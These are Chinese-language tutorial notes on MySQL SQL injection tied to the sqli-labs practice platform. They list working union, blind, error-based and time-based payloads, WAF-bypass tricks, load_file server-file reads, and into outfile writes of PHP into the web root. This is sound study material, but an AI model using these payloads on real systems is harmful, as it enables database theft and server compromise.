# 特别感谢：
- sqli-labs平台：[https://github.com/Audi-1/sqli-labs](https://github.com/Audi-1/sqli-labs)
- lcamry牛的blog：[http://www.cnblogs.com/lcamry](http://www.cnblogs.com/lcamry)

# MySQL注入

### 基本语法

- 介绍几个常用函数：

  1. version()——MySQL 版本
  2. user()——数据库用户名
  3. database()——数据库名---过滤information等敏感词查数据库
  4. @@datadir——数据库路径
  5. @@version\_compile_os——操作系统版本

- 注入一般的流程（联合查询）：

  1. 猜数据库：
     UNION SELECT schema\_name FROM information\_schema.schemata;
  2. 猜某库的数据表：
     UNION SELECT table\_name FROM information\_schema.tables WHERE table\_schema='xxx';
  3. 猜某表的所有列：
     UNION SELECT column\_name FROM information\_schema.columns WHERE table\_name='xxx';
  4. 获取某列的内容：
     UNION SELECT * FROM ;
  5. 注：union两侧的select所提取的数据字段必须相同，即column数目相同，否则会报错：The used SELECT statements have a different number of columns ；

- 字符串连接函数：
  1. concat(str1,str2,...)——没有分隔符地连接字符串；   CONCAT(id, '，', name)在参数`中间`设置分隔符；
  2. concat\_ws(separator,str1,str2,...)——含有分隔符地连接字符串；CONCAT\_WS('\_',id,name)在参数`最前面`设置分隔符；
  3. group\_concat(str1,str2,...)——连接一个组的所有字符串，默认以逗号分隔每一条数据；GROUP\_CONCAT(username,'-',password)在参数`中间`设置分隔符；
  4. 注：1,2用在查询`单一`数据（需指定where来详细查询）；
     3用在查询`全部`库，表，列数据，用的较多；

- mysql的注释符号：
  1. `--`，两个横杠，有时候需要最后加上+号用来连接语句，这个在浏览器不需要编码；
  2. `#`，井号，这个在浏览器url中需要编码成%23，必须；
  3. `/**/`，注释一段，这里在注入中一般碰到的较少，有也是单纯的一半，用来闭合最后一段，CTF有坑；

- `limit`用法：
  1. limit x,y ；从第x+1个数据开始取，取y个数据；
  2. limit x offset y ；从第y+1个数据开始取，去x个数据；
  3. 报错注入有时限制显示字符数，利用第二个来搞即可；

- 过滤infomation_schema、ORDER BY...（补天沙龙成都站http://bbs.sssie.com/thread-2006-1-1.html）：
  1. ?id=-1' UNION SELECT database();-- //xxx显示当前数据库
  2. ?id=-1' UNION SELECT 1 FROM xxx.flag;-- //如果存在flag表则返回1，不存在返回空白；以此来猜测表名；
  3. ?id=-1' UNION SELECT * FROM xxx.flag;-- //获取内容；

- 猥琐流：
  1. 使用例子：select * from users where id=1;
  2. from出现就会代替掉，输入一个单引号会转义（[https://www.t00ls.net/thread-36704-1-1.html](https://www.t00ls.net/thread-36704-1-1.html)）：
     - select * from. users where id=1;
  3. 空格被过滤（[http://www.lijiejie.com/mysql-injection-bypass-waf-2](http://www.lijiejie.com/mysql-injection-bypass-waf-2/)）：
     - 使用括号()代替空格，任何可以计算出结果的语句，都可以用括号包围起来；
     - select * from(users)where id=1;
     - 使用注释`/**/`绕过空格；
     - select * from/\*\*/users/\*\*/where id=1;
  4. 报错注入中过滤','逗号，利用exp报错来注入；（[http://www.lijiejie.com/mysql-injection-bypass-waf-3](http://www.lijiejie.com/mysql-injection-bypass-waf-3/)）；
     - select !(select \* from(select user())x)-~0; 
     - updateXML，duplicate entry报错注入，都需要使用到逗号；
  5. 不能使用大小于'<>'符号，利用greatest()函数绕过；greatest(x,y)，返回x和y中较大的那个数；
     - select greatest(ascii(mid(user(),1,1)),150)=150;
     - 如果小于150，则返回值为1，即True。
  6. 基于时间的盲注、延时注入（没逗号，没空格，没大小写符号），利用mid()||substr()函数特性来实现：
     - http://www.xxx.com/index.php?id=(sleep(ascii(mid(user()from(2)for(1)))=109))
     - 这条语句是猜解user()第二个字符的ascii码是不是111(o)，若是111，则页面加载将延迟。好处：1) 既没有用到逗号、大小于符号；2) 也没有使用空格；却可以完成数据的猜解工作！

### SQL 盲注

#### 基于布尔 SQL 盲注，即构造逻辑判断（真为1，假为0）

- 截取字符串常用函数：
  1. mid()，MID(string,start,length)
  2. substr()，SUBSTR(string, start, length)
  3. left()，LEFT(string,n)
  4. ORD()，返回字符的ASCII码（。。）
  5. ascii()，同ord()函数（。。）
  6. p.s. mid()&&substr()函数都有`from x for y`方法，即mid(user() from 1 for 1)或substr(user() from 1 for 1)；表示从第x位数据开始取，取y个数据；

- regexp 正则注入：
  1. regexp '^[a-z]' ，判断第一个字母是小写字母；regexp '^r[a-z]' ，判断第二个字母是否是小写字母；
  2. 在limit 0,1下，regexp会匹配所有的项；
  3. '^u[a-z]' -> '^us[a-z]' -> '^use[a-z]' -> '^user[a-z]' -> FALSE
  4. 如何知道匹配结束了？table_name regexp '^username$'，^是从开头进行匹配，$是从结尾开始判断
- like 匹配注入：
  1. select user() like 'ro%';   前两位如果是ro，则返回 1；

#### 基于报错的 SQL 盲注，构造 payload 让信息通过错误提示回显出来

- 常规手法（无版本要求）
  - 参考资料：[http://www.lijiejie.com/mysql-injection-error-based-duplicate-entry](http://www.lijiejie.com/mysql-injection-error-based-duplicate-entry/)
  - MySQL RAND()函数调用可以在0和1之间产生一个随机数；
  - floor()函数取浮点数的整数部分；
  - Duplicate entry ???报错的类型；
  - group by x进行分组；
  - 0x3a,0x3a,xxx,0x3a,0x3a只是为了美观，便于取数据；
  - 原理：为分组后数据计数时重复造成的错误；
    - select 1,count(\*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;
    - 以上语句可以简化成如下的形式:
    - select 1,2,count(\*) from information_schema.tables group by concat(0x3a,0x3a,version(),0x3a,0x3a,floor(rand(0)*2));
    - 如果 rand() 被禁用了可以使用用户变量来报错:
    - select min(@a:=1) from information_schema.tables group by concat(0x3a,0x3a,version(),0x3a,0x3a,@a:=(@a+1)%2);
    - 其实这是mysql的一个bug所引起的，其他数据库都不会因为这个问题而报错。
    - 注：第一、二句payload都是三个字段，具体多少字段还是需要看union前面的select的字段数，∵union前后语句得出的字段数一定要相等，以后的union问题同样；

- 新手法（mysql>>5.5.5）
  - Exp()为以 e 为底的对数函数，利用它来报错（[http://www.cnblogs.com/lcamry/articles/5509124.html](http://www.cnblogs.com/lcamry/articles/5509124.html) 、 [http://www.lijiejie.com/mysql-injection-bypass-waf-3](http://www.lijiejie.com/mysql-injection-bypass-waf-3/)）：
    - select exp(~(select * FROM(SELECT USER())a));
  - bigint 超出范围来报错，~0 是对 0 逐位取反，前面-是减号（[http://www.cnblogs.com/lcamry/articles/5509112.html](http://www.cnblogs.com/lcamry/articles/5509112.html)）：
    - select !(select * from (select user())x) - ~0;
  - mysql 重复特性，此处重复了 version，所以报错，无版本限制：
    - select \* from (select NAME\_CONST(version(),1),NAME_CONST(version(),1))x;
  - updatexml()函数是MYSQL对XML文档数据进行查询和修改的XPATH函数，xpath 语法错误让其报错（[http://www.vuln.cn/6772](http://www.vuln.cn/6772)）：
    - INSERT INTO users (id, username, password) VALUES (2,'Olivia' or updatexml(1,concat(0x3a,0x3a,(version()),0x3a,0x3a),0) or'', 'Nervo');
    - UPDATE users SET password='Nicky' or updatexml(2,concat(0x3a,0x3a,(version()),0x3a,0x3a),0) or''WHERE id=2 and username='Olivia';
    - DELETE FROM users WHERE id=2 or updatexml(1,concat(0x3a,0x3a,(version()),0x3a,0x3a),0) or'';
    - 核心：and updatexml(1,concat(0x7e,(select @@version),0x7e),1);
  - extractvalue()函数也是MYSQL对XML文档数据进行查询和修改的XPATH函数，xpath 语法错误让其报错，详细博文同上：：
    - INSERT INTO users (id, username, password) VALUES (2,'Olivia' or extractvalue(1,concat(0x3a,0x3a,database(),0x3a,0x3a)) or'', 'Nervo');
    - UPDATE users SET password='Nicky' or extractvalue(1,concat(0x3a,0x3a,database(),0x3a,0x3a)) or'' WHERE id=2 and username='Nervo';
    - DELETE FROM users WHERE id=1 or extractvalue(1,concat(0x3a,0x3a,database(),0x3a,0x3a)) or'';
    - 核心：and extractvalue(1,concat(0x7e,(select @@version),0x7e));
  - name\_const()函数是MYSQL5.0.12版本加入的一个返回给定值的函数。当用来产生一个结果集合列时 , NAME_CONST() 促使该列使用给定名称。详细博文同上：
    - INSERT INTO users (id, username, password) VALUES (1,'Olivia' or (SELECT * FROM (SELECT(name\_const(version(),1)),name_const(version(),1))a) or '','Nervo');
    - UPDATE users SET password='Nicky' or (SELECT * FROM (SELECT(name_const(version(),1)),name\_const(version(),1))a) or '' WHERE id=2 and username='Nervo';
    - DELETE FROM users WHERE id=1 or (SELECT * FROM (SELECT(name_const(version(),1)),name\_const(version(),1))a)or '';
    - 核心：union SELECT * FROM (SELECT(name\_const(version(),1)),name\_const(version(),1))a;
  - 利用子查询注入，详细博文同上；

#### 基于时间的 SQL 盲注，延时注入（if语句判断）

- if 判断语句，条件为假，执行 sleep：
  - select If(ascii(substr(database(),1,1))!=115,0,sleep(5));
- BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu 资源。了解即可。

### 导入导出的相关操作

- load\_file() 导出文件
  - Load\_file(file\_name):读取文件并返回该文件的内容作为一个字符串。
  - 使用条件：
    - A、必须有权限读取并且文件必须完全可读；
      select count(\*) from mysql.user>0/\* 如果结果返回正常,说明具有读写权限。
    - B、欲读取文件必须在服务器上；
    - C、必须指定文件完整的路径；
    - D、欲读取文件必须小于 max\_allowed\_packet ；
    - 一句话：只要不降权，并且知道`绝对路径`，放心去读；
  - 使用例子：
    - Select 1,2,load\_file("/var/www/html/1.php");
    - Select 1,2,load\_file(char(47,118,97,114,47,119,119,119,47,104,116,109,108,47,49,46,112,104,112));
    - Select 1,2,load\_file(0x2F7661722F7777772F68746D6C2F312E706870);
    - 分别利用直接读取， char ， 16进制Hex（必须带0x）来读取 /var/www/html/1.php 内容；
- into outfile ' ' 导入到文件
  - SELECT.....INTO OUTFILE 'file_name'
  - 可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有 FILE权限，才能使用此语法。file_name 不能是一个已经存在的文件。 
    - 没有file权限可以强制更改权限：
    - UPDATE user set File_priv ='Y';
    - 将所有的MYSQL用户的file权限全部开启了，
    - flush privileges;
    - 然后刷新一下权限即可。
  - 使用例子：
    - 直接将 select 内容导入到文件中：
    - Select version() into outfile '/var/www/html/1.txt';
    - 提到了 load_file(),但是当前台无法导出数据的时候，我们可以利用下面的语句：
    - select load_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’)into outfile‘c:\\wamp\\www\\test.php’
    - 可以利用该语句将服务器当中的内容导入到 web 服务器下的目录，这样就可以得到数据了。


### 注入题目源码

#### 基础知识（Less1-4）：

```
- SELECT * FROM users WHERE id='$id' LIMIT 0,1
  - ?id=-1' UNION SELECT 1,2,database();-- 
- SELECT * FROM users WHERE id=$id LIMIT 0,1
  - ?id=-1 UNION SELECT 1,2,database();--
- SELECT * FROM users WHERE id=('$id') LIMIT 0,1
  - ?id=-1') UNION SELECT 1,2,database();--
- SELECT * FROM users WHERE id=(“$id”) LIMIT 0,1
  - ?id=-1") UNION SELECT 1,2,database();--
```

#### 盲注（Less5-6）：

```
- if($row)	{	echo 'You are in...........';	} SQL语句正确，会输出这句话，并不报显位，即不在前端输出SQL查询的内容；SELECT * FROM users WHERE id='$id' LIMIT 0,1;
  1. 布尔盲注：
     - ?id=1' and left(version(),1)=5-- 用php版本第一个字符是5来判断是否是盲注；
     - 获取`库名`：
     - ?id=1' and length(database())=8-- 判断下数据库名的字符长度，以便编写payload；
     - ?id=1' and left(database(),1)>'a'-- 判断数据库名第一位是否比a大，这里库名security，s肯定大于a，则会返回那句话；逐个判断来确定第一位字符，可采用二分法提高速率，或者直接采用等于的逻辑，只有正确的时候返回一句话；
     - ?id=1' and left(database(),2)>'se'-- 逐个判断，即可获得库名security；
     - 获取`表名`：
     - ?id=1' and ascii(substr((select table\_name from information\_schema.tables where table\_schema=database() limit 0,1),1,1))=101-- 取第一个表第一个字符来进行ascii判断，步骤同上，只需改substr第二个的参数以及ascii码判断即可，也可用二分法；其实直接可以省去获得数据库名字的一步，因为这里database()直接获取的就是当前数据库；获取表名email；
     - ?id=1' and ascii(substr((select table\_name from information_schema.tables where table\_schema=database() limit 1,1),1,1))=114-- 获取第二个表，只需要改limit的第一个参数（取第二个表）即可；
     - 获取`列名`：
     - ?id=1' and 1=(select 1 from information\_schema.columns where table\_name='users' and column\_name regexp '^u[a-z]' limit 0,1)-- 利用 regexp 获取 users 表中的列，这句话验证 users 表中的列名是否有 u\*\*的列；修改regexp的'^u[a-z]'来逐步判断，得出列名；
     - ?id=1' and 1=(select 1 from information\_schema.columns where table\_name='users' and column\_name regexp '^username$' limit 0,1)-- 可以看username 字段是否存在；判断其他字段名，直接修改regexp参数即可；
     - 获取`内容`：
     - ?id=1' and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))= 68-- 利用 ord（）和 mid（）函数获取 users 表的内容，获取 username 中的第一行的第一个字符的 ascii，与 68 进行比较，即为 D；0x20为空格的hex；
     - 以上利用语法互通，只是方法名不一样但作用类似；
     - CAST (expression AS data\_type) ：expression：任何有效的SQL表达式。AS：用于分隔两个参数，在AS之前的是要处理的数据，在AS之后是要转换的数据类型。data\_type：目标系统所提供的数据类型，包括bigint和sql\_variant，不能使用用户定义的数据类型。
     - IFNULL(expr1,expr2) ：如果 expr1 不是 NULL，IFNULL() 返回 expr1，否则它返回expr2。
     - ORDER BY 语句用于根据指定的列对结果集进行排序（默认按照升序）；DESC 逆序（ORDER BY xx DESC）。以此来说明order by不只是判断字段数，还有排序的作用；
  2. 报错注入：
     - ?id=1' union select 1,count(\*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)\*2)) a from information\_schema.columns group by a--
     - ?id=1' union select 1,2,count(\*) from information\_schema.tables group by concat(0x3a,0x3a,version(),0x3a,0x3a,floor(rand(0)\*2))--
     - 以上两条是报错注入常用手法，注意字段数为3；
     - ?id=1' union select 1,2, (exp(~(select * FROM(SELECT USER())a)))-- 利用 double 数值类型超出范围进行报错注入；
     - ?id=1' union select 1,2, !(select * from (select user())x) - ~0-- 利用 bigint 溢出进行报错注入；
     - ?id=1' union select 1,2,3 from (select NAME\_CONST(version(),1),NAME\_CONST(version(),1))x;-- 利用数据的重复性；
     - ?id=1' and extractvalue(1,concat(0x7e,(select @@version),0x7e))-- 
     - ?id=1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--
     - ?id=1' union SELECT * FROM (SELECT(name\_const(version(),1)),name\_const(version(),1))a--
     - 上面三条利用的是xpath 函数报错注入；
  3. 延时注入：
     - ?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(5))-- 利用 sleep()函数进行注入，正确时输出时间不变，错误时会有 5 秒的时间延时；
     - ?id=1' UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1-- 当结果正确的时候，运行 ENCODE('MSG','by 5 seconds')操作 50000000 次，会占用一段时间；
- SELECT * FROM users WHERE id="" LIMIT 0,1;
  - $id = '"'.$id.'"';
  - $sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
  - 只是将''变成""；
```

#### 导入导出（Less7-）：

```
- SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1
  - ?id=1')) UNION SELECT 1,2,3 into outfile "/var/www/html/1.txt"--
  - ?id=1')) UNION SELECT 1,2,<?php phpinfo();?> into outfile "/var/www/html/1.txt"--
```

